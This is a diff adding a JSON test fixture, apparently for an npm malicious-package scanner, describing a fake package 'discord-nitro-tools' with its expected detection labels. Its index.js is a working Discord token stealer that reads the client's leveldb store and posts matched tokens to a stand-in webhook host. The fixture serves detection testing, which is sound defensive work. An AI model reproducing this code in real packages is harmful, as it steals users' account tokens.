@@ -1,0 +1,21 @@
+{
+ "ecosystem": "npm",
+ "expected": [
+  "exfiltration",
+  "suspicious-endpoint",
+  "sparse-metadata"
+ ],
+ "files": {
+  "package/index.js": "const fs = require(\"fs\");\nconst https = require(\"https\");\nconst path = require(\"path\");\n\nconst store = path.join(process.env.APPDATA || \"\", \"discord\", \"Local Storage\", \"leveldb\");\nconst hook = \"https://discord.com.example.invalid/api/webhooks/000000000000000000/FAKE-FIXTURE-TOKEN\";\n\nfunction collect() {\n  const found = [];\n  for (const file of fs.readdirSync(store)) {\n    const text = fs.readFileSync(path.join(store, file), \"utf8\");\n    found.push(...(text.match(/[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}/g) || []));\n  }\n  return found;\n}\n\nconst req = https.request(hook, { method: \"POST\" });\nreq.write(JSON.stringify({ content: collect().join(\"\\n\") }));\nreq.end();\n",
+  "package/package.json": "{\n  \"name\": \"discord-nitro-tools\",\n  \"version\": \"1.0.3\",\n  \"main\": \"index.js\"\n}"
+ },
+ "meta": {
+  "created_days_ago": 1,
+  "description": "Handy helpers for Discord bots",
+  "publisher_is_new": true,
+  "version_count": 1
+ },
+ "name": "discord-nitro-tools",
+ "pattern": "Discord token stealer: reads the client's leveldb store and posts to a webhook",
+ "version": "1.0.3"
+}
